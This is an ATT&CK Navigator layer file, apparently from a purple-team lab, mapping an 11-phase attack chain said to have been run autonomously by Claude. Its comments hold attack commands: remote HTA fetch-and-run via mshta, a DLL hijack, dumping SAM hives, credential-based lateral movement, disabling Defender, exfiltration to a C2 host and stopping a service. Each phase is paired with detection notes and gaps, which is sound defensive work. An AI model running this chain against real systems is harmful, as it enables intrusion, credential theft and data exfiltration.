@@ -1,0 +1,164 @@
+{
+    "name": "AGC-080 -- Full Attack Chain: Discovery to Service Disruption",
+    "versions": {
+        "attack": "16",
+        "navigator": "4.9.5",
+        "layer": "4.5"
+    },
+    "domain": "enterprise-attack",
+    "description": "Execution & Documentation Note: This scenario was executed and documented in full by Claude (Anthropic AI), operating autonomously on the lab infrastructure. | AGC-080: 11-phase chain with extended discovery. Verdict: True Positive, Confidence: High.",
+    "filters": {
+        "platforms": ["Windows", "Linux"]
+    },
+    "sorting": 0,
+    "layout": {
+        "layout": "side",
+        "aggregateFunction": "average",
+        "showID": true,
+        "showName": true,
+        "showAggregateScores": false,
+        "countUnscored": false,
+        "expandedSubtechniques": "none"
+    },
+    "hideDisabled": false,
+    "techniques": [
+        {
+            "techniqueID": "T1566.002",
+            "tactic": "initial-access",
+            "color": "#8ec843ff",
+            "comment": "AGC-080 Phase 1: QR-code phishing to updates.ashfordgrove-it.local. EID 22 DNS + EID 3 HTTP GET/POST to 10.10.40.10.",
+            "enabled": true,
+            "metadata": [],
+            "links": [],
+            "showSubtechniques": true,
+            "score": 100
+        },
+        {
+            "techniqueID": "T1218.005",
+            "tactic": "defense-evasion",
+            "color": "#8ec843ff",
+            "comment": "AGC-080 Phase 2: mshta.exe http://10.10.40.10/stage2.hta. EID 1 PID 1320 + EID 3 outbound HTTP on port 80.",
+            "enabled": true,
+            "metadata": [],
+            "links": [],
+            "showSubtechniques": true,
+            "score": 100
+        },
+        {
+            "techniqueID": "T1574.001",
+            "tactic": "privilege-escalation",
+            "color": "#ff6666ff",
+            "comment": "AGC-080 Phase 3: Planted version.dll in VulnApp path. EID 7 DISABLED in SwiftOnSecurity config. Legitimate detection gap.",
+            "enabled": true,
+            "metadata": [],
+            "links": [],
+            "showSubtechniques": true,
+            "score": 50
+        },
+        {
+            "techniqueID": "T1482",
+            "tactic": "discovery",
+            "color": "#ffe766ff",
+            "comment": "AGC-080 Phase 4: nltest + net group/user/localgroup spaced 8s apart over 40s window. EID 1 for each. Designed to evade burst detection.",
+            "enabled": true,
+            "metadata": [],
+            "links": [],
+            "showSubtechniques": false,
+            "score": 75
+        },
+        {
+            "techniqueID": "T1003.002",
+            "tactic": "credential-access",
+            "color": "#ff6666ff",
+            "comment": "AGC-080 Phase 5: reg save HKLM\\SAM + SYSTEM attempted. Access denied by OS protection. No EID 1 for reg.exe (blocked before exec).",
+            "enabled": true,
+            "metadata": [],
+            "links": [],
+            "showSubtechniques": true,
+            "score": 50
+        },
+        {
+            "techniqueID": "T1550.002",
+            "tactic": "lateral-movement",
+            "color": "#ffe766ff",
+            "comment": "AGC-080 Phase 6: net use \\\\10.10.10.102\\IPC$ with wadmin creds. Error 64 (timeout). EID 1 captures cleartext password in cmdline.",
+            "enabled": true,
+            "metadata": [],
+            "links": [],
+            "showSubtechniques": true,
+            "score": 75
+        },
+        {
+            "techniqueID": "T1102.002",
+            "tactic": "command-and-control",
+            "color": "#8ec843ff",
+            "comment": "AGC-080 Phase 7: 4x HTTPS polls to /api/v1/paste/fetch on 10.10.40.10:443. EID 3 captures all. Web-service-shaped URL + consistent payload size.",
+            "enabled": true,
+            "metadata": [],
+            "links": [],
+            "showSubtechniques": true,
+            "score": 100
+        },
+        {
+            "techniqueID": "T1039",
+            "tactic": "collection",
+            "color": "#ffe766ff",
+            "comment": "AGC-080 Phase 8: Collected hr_records, finance data, admin passwords. Synthetic (DC unreachable). EID 1 cmd.exe dir.",
+            "enabled": true,
+            "metadata": [],
+            "links": [],
+            "showSubtechniques": false,
+            "score": 75
+        },
+        {
+            "techniqueID": "T1567.002",
+            "tactic": "exfiltration",
+            "color": "#8ec843ff",
+            "comment": "AGC-080 Phase 9: POST collected.zip (520 bytes) to /api/v1/paste/create. EID 3 HTTPS connection. Volume anomaly on C2 channel.",
+            "enabled": true,
+            "metadata": [],
+            "links": [],
+            "showSubtechniques": true,
+            "score": 100
+        },
+        {
+            "techniqueID": "T1562.001",
+            "tactic": "defense-evasion",
+            "color": "#ffe766ff",
+            "comment": "AGC-080 Phase 10: Set-MpPreference -DisableRealtimeMonitoring succeeded. No EID 5001 captured. On origin host (CH-01), not destination.",
+            "enabled": true,
+            "metadata": [],
+            "links": [],
+            "showSubtechniques": true,
+            "score": 75
+        },
+        {
+            "techniqueID": "T1489",
+            "tactic": "impact",
+            "color": "#8ec843ff",
+            "comment": "AGC-080 Phase 11: sc stop WpnService. EID 1 captures sc.exe. Running->Stopped. No EID 7036 (Win11 gap). Service restarted in cleanup.",
+            "enabled": true,
+            "metadata": [],
+            "links": [],
+            "showSubtechniques": false,
+            "score": 100
+        }
+    ],
+    "gradient": {
+        "colors": ["#ff6666ff", "#ffe766ff", "#8ec843ff"],
+        "minValue": 0,
+        "maxValue": 100
+    },
+    "legendItems": [
+        { "label": "Confidence: Medium", "color": "#ff6666ff" },
+        { "label": "Confidence: High", "color": "#ffe766ff" },
+        { "label": "Confidence: Critical", "color": "#8ec843ff" }
+    ],
+    "metadata": [],
+    "links": [],
+    "showTacticRowBackground": false,
+    "tacticRowBackground": "#dddddd",
+    "selectTechniquesAcrossTactics": true,
+    "selectSubtechniquesWithParent": false,
+    "selectVisibleTechniques": false
+}
